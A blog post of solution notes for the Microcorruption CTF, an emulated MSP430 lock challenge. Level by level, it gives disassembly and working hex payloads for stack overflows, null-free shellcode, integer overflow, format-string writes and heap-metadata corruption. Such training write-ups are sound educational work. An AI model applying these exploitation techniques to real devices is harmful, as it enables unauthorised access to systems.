---
title: Microcorruption Notes
date: 2025-01-07 18:00:00 +0000
categories: [Blog, Embedded Security]
tags: [microcorruption]
description: My (micro)solutions for Microcorruption CTF
render_with_liquid: false
---

<style>body {text-align: justify}</style>

The description of the CTF is [**here**](https://microcorruption.com/about). The manual that has basic introduction to MSP430 assembly and interrupts for LockIT Pro is [**here**](https://microcorruption.com/public/manual.pdf). Instruction set description is available [**here**](https://www.ti.com/sc/docs/products/micro/msp430/userguid/ag_b.pdf).

## Tutorial

In Tutorial level (which seems to be located in Chicago according to the map), the function `check_password` checks if the password length is 8 character (9 characters including null byte for EOL) and sets the flag (`r15`) if the check was sucessfully passed.
```assembly
4484 <check_password>
4484:  6e4f           mov.b	@r15, r14 ; r15 holds the address containing the password provided by the user, r14 holds the value
4486:  1f53           inc	r15
4488:  1c53           inc	r12 ; counter for password length
448a:  0e93           tst	r14 ; check if the value is null byte to determine the end of string
448c:  fb23           jnz	$-0x8 <check_password+0x0> ; loop
448e:  3c90 0900      cmp	#0x9, r12 ; check if the password length is 8 bytes
4492:  0224           jz	$+0x6 <check_password+0x14> ; jump to set a flag to open the door
4494:  0f43           clr	r15
4496:  3041           ret
4498:  1f43           mov	#0x1, r15
449a:  3041           ret
```

## New Orleans (rev a.01)

The function `check_password` checks if the password is the one that is stored in memory at the address `0x2400`.
```assembly
44bc <check_password>
44bc:  0e43           clr	r14 ; set r14 to 0
44be:  0d4f           mov	r15, r13 ; r13 and r15 hold the address containing the password provided by the user
44c0:  0d5e           add	r14, r13 ; r14 is the counter which defines the current position for the character to compare
44c2:  ee9d 0024      cmp.b	@r13, 0x2400(r14) ; compare the corresponding characters
44c6:  0520           jnz	$+0xc <check_password+0x16> ; if the characters are not the same, exit
44c8:  1e53           inc	r14
44ca:  3e92           cmp	#0x8, r14 ; length of the password, including null byte for EOL
44cc:  f823           jnz	$-0xe <check_password+0x2>
44ce:  1f43           mov	#0x1, r15
44d0:  3041           ret
44d2:  0f43           clr	r15
44d4:  3041           ret
```

Live memory dump of the address reveals the password: ```2400: 605c 2559 6259 7300 0000 0000 0000 0000   `\%YbYs.........```

## Sydney (rev a.02)

The password is hardcoded in the instructions' operands from `check_password` function; the bytes are compared directly. One has to consider the endianness as MSP430 is little endian and check that the input is hex encoded. The password is `542c4f545a465a4f`.
```assembly
448a <check_password>
448a:  bf90 542c 0000 cmp	#0x2c54, 0x0(r15) ; r15 holds the password provided by the user
4490:  0d20           jnz	$+0x1c <check_password+0x22>
4492:  bf90 4f54 0200 cmp	#0x544f, 0x2(r15)
4498:  0920           jnz	$+0x14 <check_password+0x22>
449a:  bf90 5a46 0400 cmp	#0x465a, 0x4(r15)
44a0:  0520           jnz	$+0xc <check_password+0x22>
44a2:  1e43           mov	#0x1, r14 ; set the flag
44a4:  bf90 5a4f 0600 cmp	#0x4f5a, 0x6(r15)
44aa:  0124           jz	$+0x4 <check_password+0x24>
44ac:  0e43           clr	r14
44ae:  0f4e           mov	r14, r15
44b0:  3041           ret
```

## Hanoi (rev b.01)

First lock with HSM (hardware security module) version 1. The program informs the user that the password shall be between 8 and 16 characters. `test_password_valid` function performs an interrupt (`0x7d`) to test whether the password provided by the user (stored at `0x2400`, passed as `r15`) is correct and if so, sets a flag at `0x43f8`, passed as `r14`; the flag is written to `r15` at the end of the function. In the `login` function, however, the door is unlocked based on the value at the address `0x2410` (the value is controlled by the attacker as there is check for bounds, even though the program specifies required password length) which shall be `0x31` (1 in ASCII). `r15` is only used to determine whether or not the value at `0x2410` shall be overwritten with `a8` which would effectively **prevent the user from unlocking the door, if the password is correct**.

```assembly
4520 <login>
...
4544:  b012 5444      call	#0x4454 <test_password_valid>
4548:  0f93           tst	r15 ; flag set by HSM
454a:  0324           jz	$+0x8 <login+0x32>
454c:  f240 a800 1024 mov.b	#0xa8, &0x2410 ; if the password is correct, prevent user from unlocking the door by setting 0x2410 to random value?
4552:  3f40 d344      mov	#0x44d3 "Testing if password is valid.", r15
4556:  b012 de45      call	#0x45de <puts>
455a:  f290 3100 1024 cmp.b	#0x31, &0x2410 ; check if the 17th byte in password provided is 1
4560:  0720           jnz	$+0x10 <login+0x50>
4562:  3f40 f144      mov	#0x44f1 "Access granted.", r15
4566:  b012 de45      call	#0x45de <puts>
456a:  b012 4844      call	#0x4448 <unlock_door>
456e:  3041           ret
4570:  3f40 0145      mov	#0x4501 "That password is not correct.", r15
4574:  b012 de45      call	#0x45de <puts>
4578:  3041           ret
```

So to get the door unlocked, input shall override 17th byte (`0x2410`) to 1 (`0x31`).

## Cusco (rev b.02)

This is the second version of the lock from Hanoi, the changelog states `fixed issues with passwords which may be too long`. The password is written on the stack and stack pointer points to the password after it has been entered. At the end of the `login` function, the program adds 16 bytes to the stack pointer and returns to the address pointed by the stack pointer:
```assembly
4500 <login>
...
453a:  3150 1000      add	#0x10, sp
453e:  3041           ret
```
As there is no ASLR or stack canary, it is possible to *redirect program counter using stack buffer overflow*. The program shall execute `unlock_door` function that is located at `0x4446` after the return instruction. The answer is `414141414141414141414141414141414644`.

The stack to visualize the exploitation: 
<pre>
43e0: 5645 0300 ca45 0000 0a00 0000 3a45 4141   VE...E......:EAA ; SP points to 43ee (41)
43f0: 4141 4141 4141 4141 4141 4141 4141 4644   AAAAAAAAAAAAAAFD ; After add is executed, it points to 4446
4400: 0040 0044 1542 5c01 75f3 35d0 085a 3f40   .@.D.B\.u.5..Z?@
</pre>

## Reykjavik (rev a.03)

There is no HSM, but `developers have implemented military-grade on-device encryption to keep the password secure`. Before `main` is called, function `__do_copy_data` copies `0x7c` bytes from `0x4538` to `0x2400`. The data block contains the following bytes that are not valid instructions:
```
4c85 1bc5 80df e9bf 3864 2bc6 4277 62b8
c3ca d965 a40a c1a3 bbd1 a6ea b3eb 180f
78af ea7e 5c8e c695 cb6f b8e9 333c 5aa1
5cee 906b d1aa a1c3 a986 8d14 08a5 a22c
baa5 1957 192d abe1 66b9 7d38 4a08 e95c
d919 8069 07a5 ef01 caa2 a30d f344 815e
3e10 e765 2bc8 2837 abad ab3f 8cfa 754d
8ff0 b083 6b3e b3c7 aefe b409
```

`main` calls `enc` function passing the address `0x2400` (which currently holds the encrypted data) and `0xf8` (the size of encrypted data doubled) that is followed by calling whatever is at `0x2400`. `enc` contains RC4 algorithm which can be recognized by looking at the flow: two loops that iterate 256 times (Key Scheduling Algorithm); one more loop containing PRGA and XOR (Figure 1). `enc` will decrypt the data in-place that has been passed to it. The algorithm is modified to permit keys up to 16 bytes (see `and 0xf, r10` on the screenshot).

![RC4 algorithm in MSP430 from the level](/assets/img/microcorruption_rc4.png)
_Figure 1: Screenshot of Cutter with RC4 algorithm explained from the level_

The bytes located at `0x4472` contain the string `ThisIsSecureRight?`, however, as the algorithm limits key length to 16 bytes, the actual key is `ThisIsSecureRigh`. The data block can be decrypted using several methods:
* [CyberChef](https://cyberchef.org/#recipe=RC4(%7B'option':'UTF8','string':'ThisIsSecureRigh'%7D,'Hex','Hex')&input=NGM4NTFiYzU4MGRmZTliZjM4NjQyYmM2NDI3NzYyYjhjM2NhZDk2NWE0MGFjMWEzYmJkMWE2ZWFiM2ViMTgwZjc4YWZlYTdlNWM4ZWM2OTVjYjZmYjhlOTMzM2M1YWExNWNlZTkwNmJkMWFhYTFjM2E5ODY4ZDE0MDhhNWEyMmNiYWE1MTk1NzE5MmRhYmUxNjZiOTdkMzg0YTA4ZTk1Y2Q5MTk4MDY5MDdhNWVmMDFjYWEyYTMwZGYzNDQ4MTVlM2UxMGU3NjUyYmM4MjgzN2FiYWRhYjNmOGNmYTc1NGQ4ZmYwYjA4MzZiM2ViM2M3YWVmZWI0MDk)
* python:
```python
from arc4 import ARC4
rc4 = ARC4(b"ThisIsSecureRigh")
ciphertext = bytes.fromhex("4c851bc580dfe9bf38642bc6427762b8c3cad965a40ac1a3bbd1a6eab3eb180f78afea7e5c8ec695cb6fb8e9333c5aa15cee906bd1aaa1c3a9868d1408a5a22cbaa51957192dabe166b97d384a08e95cd919806907a5ef01caa2a30df344815e3e10e7652bc82837abadab3f8cfa754d8ff0b0836b3eb3c7aefeb409")
rc4.decrypt(ciphertext)
```
* simply putting a breakpoint on the call to `0x2400` in `main`. 

Then, using the disassembler, view the code:

![Login function from the level](/assets/img/microcorruption_login.png)
_Figure 2. Screenshot of Cutter with login function from the level_

It prints the message `what's the password?` (stored at `0x4520`) and asks the user to input the password. After that, it compares the first two bytes with the hardcoded values. Considering the endianness, the solution will be any password that starts with `1ad6` (hex encoded). 

The reason for having `0xf8` as the size of encrypted data and not `0x7c` (true encrypted data block size) may be to overwrite the key stream or confuse the attacker.

## Whitehorse (rev c.01)

The lock is attached to HSM version 2. **The main difference between HSM version 1 and HSM version 2** is that the first one only checks the password and sets the flag in memory, while second checks the password and sends an interrupt to unlock the door. Essentialy, this is an upgraded version of the lock from Cusco level. `main` contains only a call to `conditional_unlock_door`; there is no `unlock_door` function in the program at all. Thus, shellcode written on the stack which would replicate the `unlock_door` functionality is required to pass the level. The shellcode will be executed using the same technique from Cusco.

The simplest shellcode looks like this (`30127f00b0123245` in bytes):
```assembly
push    #0x7f ; 0x7f is an interrupt to unlock the door according to the manual
call    #0x4532 <INT>
```
The password is written to `0x3088` and the return address is stored at `0x3098`. There is no need to worry about the size of the shellcode as `0x30` is passed to `getsn` function, meaning the shellcode size can be not more than 46 bytes (2 bytes are taken by the return address). It is possible to execute shellcode after (the return address will point to `0x309a`) or before the return address (the return address will point to `0x3088`) as there is enough space for both approaches (the amount of CPU cycles is the same):
* After: `313131313131313131313131313131319a3030127f00b0123245`
* Before: `30127f00b012324531313131313131318830`

## Montevideo (rev c.03)

The lock is attached to HSM version 2 and `developers have rewritten the code  to conform to the internal secure development process`. This is an improvement over Whitehorse level. `login` function now writes the password provided by the user to `0x2400` and then copies it to the stack utilizing `strcpy` followed by a call to `memset` which zeroes the memory where the password was stored:

```assembly
44f4 <login>
...
4508:  3e40 3000      mov	#0x30, r14
450c:  3f40 0024      mov	#0x2400, r15
4510:  b012 a045      call	#0x45a0 <getsn>
4514:  3e40 0024      mov	#0x2400, r14
4518:  0f41           mov	sp, r15
451a:  b012 dc45      call	#0x45dc <strcpy>
451e:  3d40 6400      mov	#0x64, r13
4522:  0e43           clr	r14
4524:  3f40 0024      mov	#0x2400, r15
4528:  b012 f045      call	#0x45f0 <memset>
...
4544:  3150 1000      add	#0x10, sp
4548:  3041           ret
```

`strcpy` copies the [null-terminated string](https://en.cppreference.com/w/cpp/string/byte/strcpy), meaning that if the shellcode contains null bytes, then it will be truncated. The only null byte in Whiterose solution is `push #0x7f` which is assembled to `30127f00`. Null bytes can be prevented by using arithmetical operations (XOR, SUB, ADD). The shellcode may look as follows:
```assembly
3f40 8011      mov	#0x1180, r15
3fe0 ff11      xor	#0x11ff, r15 ; r15 now contains 0x7f
0f12           push	r15
b012 4c45      call	#0x454c
```
The password is written to `0x43ee`, the return address is stored at `0x43fe` and `INT` function is at `0x454c`. As with Whiterose level, it is possible to execute shellcode after (the return address will point to `0x4402`; not to `0x4400` because of the null byte in the address itself; not to `0x4401` because the instruction address will be unaligned) or before the return address (the return address will point to `0x43ee`):
* After: `31313131313131313131313131313131024431313f4080113fe0ff110f12b0124c45` (more CPU cycles because of `strcpy`)
* Before: `3f4080113fe0ff110f12b0124c453131ee43`

Another solution would be to take `0x7e` which is passed to `INT` function inside `conditional_unlock_door` at `0x445e` (`445c:  3012 7e00      push	#0x7e`), write it in `r15` and increment, thus creating `0x7f`:
```assembly
1f42 5e44    mov &0x445e, r15
1f53         inc r15
```
The shellcode looks as follows: `1f425e441f530f12b0124c4531313131ee43`. It is *2 bytes less in length* comparing to the previous approach (particularly, executing shellcode *before* the return address), although the amount of CPU cycles is the same.

The same approach can be applied for **Whitehorse** level as well, but the memory addresses are different: `1f425e441f530f12b0123245313131318830`

## Johannesburg (rev b.04)

The lock is attached to HSM version 1 and `a firmware update rejects passwords which are too long`. The program uses `strcpy` and contains `unlock_door` function that is located at `0x4446`. `login` function also contains hardcoded stack canary (`0x30`) at `0x43fd` (byte before the return address on the stack):
```assembly
452c <login>
...
4552:  3e40 0024      mov	#0x2400, r14
4556:  0f41           mov	sp, r15
4558:  b012 2446      call	#0x4624 <strcpy>
...
4570:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4574:  b012 f845      call	#0x45f8 <puts>
4578:  f190 3000 1100 cmp.b	#0x30, 0x11(sp) ; hardcoded stack canary
457e:  0624           jz	$+0xe <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call	#0x45f8 <puts>
4588:  3040 3c44      br	#0x443c <__stop_progExec__>
458c:  3150 1200      add	#0x12, sp
4590:  3041           ret
```
The password is written to `0x43ec` and the return address is stored at `0x43fe`. With hardcoded stack canary, the 18th byte of the shellcode must be `0x30` followed by the address of `unlock_door` to overwrite the return address: `3131313131313131313131313131313131304644`.

## Santa Cruz (rev b.05)

The lock is attached to HSM version 1 and `a firmware update further rejects passwords which are too long`. This is the first lock with username and password.

After entering username and password, it uses `strcpy` to copy data to `0x43a2` and `0x43b5` respectively. Then, it calculates the length of the password using a loop in order to check if the length is between `0x08` and `0x10` (those numbers are defined at `0x43b3` and `0x43b4`) and if not, then the program will exit:

```assembly
4550 <login>
...
45d0:  0f4b           mov	r11, r15 ; Calculating the length of the password, r14 is initialized to 0x43b4, incremented in a loop until it reaches zero byte
45d2:  0e44           mov	r4, r14
45d4:  3e50 e8ff      add	#0xffe8, r14
45d8:  1e53           inc	r14
45da:  ce93 0000      tst.b	0x0(r14)
45de:  fc23           jnz	$-0x6 <login+0x88>
45e0:  0b4e           mov	r14, r11 ; r11 saves the address of r14 which shall hold the address of the first null byte after the password
45e2:  0b8f           sub	r15, r11 ; r11 - r15 (r15 holds 0x43b5 which is the address of the password's first byte), so now r11 holds the length of the password
45e4:  5f44 e8ff      mov.b	-0x18(r4), r15 ; check if it is higher than 0x10 and if so, exit
45e8:  8f11           sxt	r15
45ea:  0b9f           cmp	r15, r11
45ec:  0628           jnc	$+0xe <login+0xaa>
45ee:  1f42 0024      mov	&0x2400, r15
45f2:  b012 2847      call	#0x4728 <puts>
45f6:  3040 4044      br	#0x4440 <__stop_progExec__>
45fa:  5f44 e7ff      mov.b	-0x19(r4), r15 ; check if it is lower than 0x08 and if so, exit
45fe:  8f11           sxt	r15
4600:  0b9f           cmp	r15, r11
4602:  062c           jc	$+0xe <login+0xc0>
4604:  1f42 0224      mov	&0x2402, r15
4608:  b012 2847      call	#0x4728 <puts>
460c:  3040 4044      br	#0x4440 <__stop_progExec__>
```

If the checks are passed, then it will call `0x7d` interrupt. At the end of the `login` function, it returns to address that is stored at `43cc`. The flaw is that it does not check if the length of the username is between 8 and 16 characters which means that it is possible to overwrite the return address to `unlock_door` which is at `0x444a`. If the password is incorrect (which will be our case as it depends on the flag set by HSM), before jumping to `ret` instruction, the function also performs a check at the end of the function if one of the bytes before the return address is zeroed (stack canary at `0x43c6`), which shall be taken into account as well:

```assembly
464c:  c493 faff      tst.b	-0x6(r4)
4650:  0624           jz	$+0xe <login+0x10e>
4652:  1f42 0024      mov	&0x2400, r15
4656:  b012 2847      call	#0x4728 <puts>
465a:  3040 4044      br	#0x4440 <__stop_progExec__>
```
It can be accomplished by entering password that is 17 bytes long to insert a null byte at `0x43c6` (`strcpy` will do that for us) and modifiying the maximum number of bytes for the password when entering username. So the answer will be:
```
Username: 3131313131313131313131313131313131081231313131313131313131313131313131313131313131314a44
Password: 3131313131313131313131313131313131
```

## Jakarta (rev b.06)

The lock is attached to HSM version 1 and the developers `added further mechanisms to verify that passwords which are too long will be rejected`. The username and password together may be no more than 32 characters.

After entering the username, the program counts how many bytes are in there and if it is bigger than 32 bytes (`0x21`) - stops program execution:

```assembly
4592:  3f40 0124      mov	#0x2401, r15 ; calculate the size of entered username 
4596:  1f53           inc	r15
4598:  cf93 0000      tst.b	0x0(r15)
459c:  fc23           jnz	$-0x6 <login+0x36>
459e:  0b4f           mov	r15, r11
45a0:  3b80 0224      sub	#0x2402, r11
45a4:  3e40 0224      mov	#0x2402, r14
45a8:  0f41           mov	sp, r15
45aa:  b012 f446      call	#0x46f4 <strcpy>
45ae:  7b90 2100      cmp.b	#0x21, r11 ; check if the size is not more than 32 bytes
45b2:  0628           jnc	$+0xe <login+0x60>
45b4:  1f42 0024      mov	&0x2400, r15
45b8:  b012 c846      call	#0x46c8 <puts>
45bc:  3040 4244      br	#0x4442 <__stop_progExec__>
```

The same goes for password, but before doing the check, it adds `r15` to `r11` to take into account the length of the username (otherwise it would be that the password can be 32 bytes long *and* username can be 32 bytes long):

```assembly
45ee:  3f40 0124      mov	#0x2401, r15
45f2:  1f53           inc	r15
45f4:  cf93 0000      tst.b	0x0(r15)
45f8:  fc23           jnz	$-0x6 <login+0x92>
45fa:  3f80 0224      sub	#0x2402, r15
45fe:  0f5b           add	r11, r15 ; r11 stores the length of the username
4600:  7f90 2100      cmp.b	#0x21, r15 ; check if the size is not more than 32 bytes
4604:  0628           jnc	$+0xe <login+0xb2>
4606:  1f42 0024      mov	&0x2400, r15
460a:  b012 c846      call	#0x46c8 <puts>
460e:  3040 4244      br	#0x4442 <__stop_progExec__>
```

There are no checks if the value of `r15` overflows which permits to do integer overflow (on top of that, `cmp.b` is used), so that the sum of username and password lengths is `0x100`. There are no stack canary and the task is to overwrite the return address once again at `0x4016` to point to `unlock_door` at `0x444c`. So the solution will be:
```
Username (0x20 bytes long): 3131313131313131313131313131313131313131313131313131313131313131
Password (0xe0 bytes long): 313131314c443131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131
```

## Addis Ababa (rev b.03)

The lock is attached to HSM version 1 and developes `have improved the security of the lock by ensuring passwords can not be too long` and **usernames are printed back to the user for verification**. The format for login has changed to `username:password` instead of two separate requests for input. `unlock_door` function is at `0x44da`. `main` function calls `test_password_valid` to check if the username and password provided are correct which is done by setting byte at `0x3232` to some value other than null byte.

The usernames are printed back to the user by calling `printf` which accepts format strings *after* a call to `test_password_valid` happened and *before* the flag is checked inside `main` function, thus making it possible to use [format string vulnerability](https://web.archive.org/web/20250308001710/https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf) to overwrite value at `0x3232`. In this level it can be used for both **arbitrary memory read and write**. For that purposes the following parameters are used:
- `%x` to move the stack pointer towards the format string (internally, if there are any format parameters, then `printf` will make output string out of them at `0x321c` and the stack pointer will change to `0x321a`);
- `%s` to print the string from an address in memory (it will take the hex number from the stack and print whatever is at that address which corresponds to the number taken from the stack);
- `%n` which stores the number of characters written at a particular address in memory following the same logic as `%s`, but instead of printing — writes an integer value.

For example, to read a string from `0x44e6` (arbitrary address in memory, stores `Login with username:password below to authenticate`) the following string can be used: `e64425782573` (`%x%s` are parameters, `e644` — address in little endian, written to the stack).

To overwrite flag at `0x3232` the following string is used: `32322578256e`. `%x%n` are parameters, `%n` will write the number of bytes written (2) to whatever address is currently pointed by the stack pointer, while `%x` moves the stack pointer towards the format string which is `0x3232`.

## Novosibirsk (rev c.02)

This lock is attached to HSM version 2 and got "features" from rev b.03 — printing the username back to the user using `printf`.

As there is no `unlock_door`, shellcode which makes interrupt `0x7f` is required. The username's length can be up to 500 bytes as indicated by the arguments passed to `getsn`:
```assembly
4454:  3e40 f401      mov	#0x1f4, r14
4458:  3f40 0024      mov	#0x2400, r15
445c:  b012 8a45      call	#0x458a <getsn>
```

`conditional_unlock_door` executes an interrupt `0x7e` and with arbitrary write it is possible to modify the value pushed to the stack to `0x7f` that will open the door. `push #0x7e` is at `0x44c6`, but only the operand must be modified which is at `0x44c8`. Unlike the previous level, there is no need for `%x` as stack pointer already points to the password, so only `%n` and the corresponding number of characters are required:
`c8444141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141256e`

It is not possible to overwrite the return address from `printf` (stored at `0x4208` and has value `0x447a`) in order to call our shellcode (spend less CPU cycles at least) which would be at `0x2400` because the address which must be overwritten (`0x4209` from `0x44` to `0x24`) will be unaligned.

## Algiers (rev d.01)

This is the first lock that contains LockIT Pro Account Manager and from the details: `The Account Manager contains a mapping of users to PINs, each of  which is 4 digits. The system supports hundreds of users, each configured with his or her own PIN, without degrading the performance of the manager.`

The program asks the user for username and password (which uses the same string as username to ask the user for some reason). The program notifies that passwords shall be between 8 and 16 characters. Inside `login` function it uses `malloc` to allocate chunks at heap for username and password, both have size `0x10`. After the call to `test_password_valid`, it frees the allocated chunks, first the one allocated for the password and then the one for the username. There is nothing interesting in `test_password_valid` except for usage of `0x7d` interrupt that indicates HSM version 1 being used.

Because there is no check for the data size and `getsn` accepts up to 48 bytes (`0x30`) from the user for both username and password, it is possible to overwrite heap chunk's metadata (for the password chunk and for the unallocated, third chunk), so that when `free` is called, arbitrary write is performed. To do that, it is required to first understand metadata structure for heap chunks (total 6 bytes long): 
- two bytes represent the address for the previous heap chunk
- two bytes represent the address for the next heap chunk
- 2 bytes of mixed status flags & size of the chunk, the last bit indicates whether it is allocated or not
- user data stored in the chunk

Here is an example of how it looks in memory when both heaps are allocated and filled with data:

<pre>
2400: 0824 0010 0000 0000 0824 1e24 2100 3131   .$.......$.$!.11
2410: 3131 3131 3131 3100 0000 0000 0000 0824   1111111........$
2420: <em><strong>3424 2100</strong></em> 3131 3131 3131 3131 3131 0000   4$!.1111111111..
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
</pre>

When the second heap is freed, `free` changes the metadata, so that next allocated chunk is also the previous one (because the next is not allocated, bit is not set), along with status flags & size:

<pre>
2400: 0824 0010 0000 0000 0824 1e24 2100 3131   .$.......$.$!.11
2410: 3131 3131 3131 3100 0000 0000 0000 0824   1111111........$
2420: <em><strong>0824 c21f</strong></em> 3131 3131 3131 3131 3131 0000   .$..1111111111..
2430: 0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........
</pre>

If the heap chunk is being unallocated, then `free` function will also check metadata for the previous chunk (and next, but one is interested solely in the previous chunk being unallocated) and, *if the metadata indicates that the chunk is not allocated*, `free` will merge those two chunks by modifying:
- the address of the next chunk inside a previous chunk's metadata to point to the next chunk from the chunk that is currently being unallocated
- 2 bytes for mixed status flags & size of the previous chunk which is calculated by adding: the current value in those 2 bytes from the previous chunk; the current value in those 2 bytes from the chunk that is currently being unallocated *which is decreased by 1 before the operation performed because the last bit is inverted*; 6 bytes which is the size of chunk's metadata

To demo this behavior, the following values can be used:

Username: `31313131313131` (actually, any will suffice as long as it does not overwrite the second chunk's metadata)

Password: `313131313131313131313131313131311e24082401` (the last byte is the most important as it signals that the chunk is allocated, so `free` won't merge it as well which would add unnecessary bytes to status flags & size bytes)

Before the first call to `free` occurs, it is also required to set a byte at `0x240c` that is the first chunk's status flags & size to `0x20` with `let 240c = 20` command to make the first chunk unallocated (last bit is set when the value is `0x21`). The result is that status flags & size bytes were decreased by 1 for the second chunk to `0x20` and *then* added to the previous chunk's metadata along with modifying the next chunk's address:

```diff
- 2400: 0824 0010 0000 0000 0824 1e24 2000 3131   .$.......$.$ .11
+ 2400: 0824 0010 0000 0000 0824 3424 4600 3131   .$.......$4$F.11
2410: 3131 3131 3100 0000 0000 0000 0000 0824   11111..........$
- 2420: 3424 2100 3131 3131 3131 3131 3131 3131   4$!.111111111111
+ 2420: 3424 2000 3131 3131 3131 3131 3131 3131   4$ .111111111111
- 2430: 3131 3131 1e24 0824 0100 0000 0000 0000   1111.$.$........
+ 2430: 3131 3131 0824 0824 0100 0000 0000 0000   1111.$.$........
2440: 0000 0000 0000 0000 0000 0000 0000 0000   ................
```

It means that an attacker can manipulate the value of any address in memory as metadata for the second chunk can be manipulated by overriding it with the data from the first chunk. 

The first obvious solution would be to overwrite the return address of the `login` function to point to `unlock_door` function which is at `0x4564`. The return address is stored at `0x439a` and holds the address `0x4440` (`__stop_progExec__`). To get `0x4564` it would require status flags & size to be `0x11f` because: `0x4564` - (`0x4440` (current value) + `0x6` (metadata size) - `0x1` (the status flags & size value is reduced by one before adding)) = `0x11f`. Also, the status flags & size bytes are 4 bytes away from the start of chunk's metadata which means that `0x439a` - `0x4` = `0x4396` shall be used as the address for previous chunk's metadata:

Username: `31313131313131313131313131313131964334241f01`

Password: `313131313131313131313131313131311e24082401`

The second solution would be not to call `free` two times, but to modify return address for `free` function during the first call. The return address is stored at `0x4394` and holds the address `0x46a8`, so to get `0x4564` integer overflow is required. Following the same logic as for the previous solution, the value of status flags & size for the second chunk would be `0xfeb6`; the address for previous chunk's metadata - `0x4390`. The password stays the same, only the username changes (true for all subsequent solutions):

Username: `3131313131313131313131313131313190433424b6fe`

The third solution is based on the fact that `unlock_door` function is right after `free` function inside the memory which means that it is possible to overwrite last bytes of `free` function to jump straight into `unlock_door` during the first call. The disassembly looks as follows:
```assembly
4556:  9f4e 0200 0200 mov	0x2(r14), 0x2(r15)
455c:  8e4f 0000      mov	r15, 0x0(r14)
4560:  3b41           pop	r11
4562:  3041           ret
4564 <unlock_door>
4564:  3012 7f00      push	#0x7f
4568:  b012 b646      call	#0x46b6 <INT>
456c:  2153           incd	sp
456e:  3041           ret
```
 
The task is to overwrite `ret` instruction, do not use `call` and do not corrupt `unlock_door`. To do that, `0x4562` shall be overwritten to anything dummy considering that: (a) previous 2 bytes (`pop r11`) will also be overwritten to point to the next chunk's address, so whatever address is used for this, metadata 4 bytes away shall also indicate that it is allocated; (b) endianness is little-endian, so instead of adding `0x3041`, `0x4130` is used. Luckily, `0x3424` (which is `0x2434` address, third chunk on the heap) corresponds to `jz $+0x6a` instruction and zero bit of the status register is not set by the end of the `free` function. So it is possible to overwrite the end of the function with two jumps that will not be taken:
```assembly
4556:  9f4e 0200 0200 mov	0x2(r14), 0x2(r15)
455c:  8e4f 0000      mov	r15, 0x0(r14)
4560:  3424           jz	$+0x6a
4562:  3424           jz	$+0x6a
4564 <unlock_door>
4564:  3012 7f00      push	#0x7f
4568:  b012 b646      call	#0x46b6 <INT>
456c:  2153           incd	sp
456e:  3041           ret
```

The password will stay the same, but the username will be modified to this (again, integer overflow to get `0x2434` which will be written backwards in memory):

Username: `313131313131313131313131313131315e453424fee2`

The first approach uses 7351 CPU cycles, while second and third — 7268 and 7267 CPU cycles respectively.

## Vancouver (LockIT 2, rev a.01)

From the overview: `The company is under new management. This series provides a debug interface for in-field debugging. This lock only accepts biometric and NFC inputs, and does not have a traditional password prompt.` There is also an example debug payload provided: `8000023041`. The debug payload consists of: 
- an address where the payload shall be written in memory (2 bytes); 
- the size of the payload (1 byte); 
- instructions to execute. 

The size of the payload is compared against a hardcoded value and must be `0x02` or bigger (`cmp` followed by `jc`) even if the *entered* payload itself is bigger/smaller:

```assembly
443e <main>
...
4474:  5a42 0224      mov.b	&0x2402, r10 ; the debug payload is written to 0x2400, 0x2402 holds the size of the payload
4478:  2a93           cmp	#0x2, r10 ; comparison against a hardcoded value, must be at least 2
447a:  052c           jc	$+0xc <main+0x48>
447c:  3f40 ba45      mov	#0x45ba "Invalid payload length", r15
4480:  b012 de44      call	#0x44de <puts>
4484:  e03f           jmp	$-0x3e <main+0x8> ; jump to start
4486:  3f40 d145      mov	#0x45d1 "Executing debug payload", r15
448a:  b012 de44      call	#0x44de <puts>
...
```

If the check for length has been passed, then it will use `memcpy` function to copy the amount of bytes (defined with size) of the payload to an address specified by the user. After that, it will perform a call to that address. On top of that, there is no `unlock_door` function, so shellcode is required to execute an interrupt function that is at `0x44a8`. 

Although it is possible to modify the payload to just our own code like this: `80000830127f00b012a844`, it will result in 19657 CPU cycles. Knowing the address where the debug payload resides (no ASLR + no memory protection), it would be better to craft a payload which would execute our code that is already inside a memory at `0x2400` region. Because of the requirement to copy at least two bytes that are valid instruction before our code is executed without overwriting `push #0x7f` and `call #0x44a8 <INT>` part, dummy instruction is also required.

The dummy instruction could be `mov.b r14, r14` which is represented as `0x4e4e`. So, the payload (actual instructions) starts at `0x2403` (byte `0x4e` at that address), the address where payload shall be copied is `0x2404` and the size of the payload is `0x2`, the `memcpy` will copy two bytes starting from `0x2403` to two bytes at `0x2404` which would result in overwrite (byte `0x2404` is overwritten with `0x4e` and simultaniously copied to `0x2405`). After that, the code is executed starting from `0x2404` which will result in the execution of the following code:

```assembly
mov.b	r14, r14
push	#0x7f
call	#0x44a8
```

The answer is: `2404024e000030127f00b012a844` (after copying the bytes, `0x2400` holds `2404024e4e4e30127f00b012a844` ). This approach results in 19604 CPU cycles.

## Offtop
Baku is located in Kyrgystan on the map.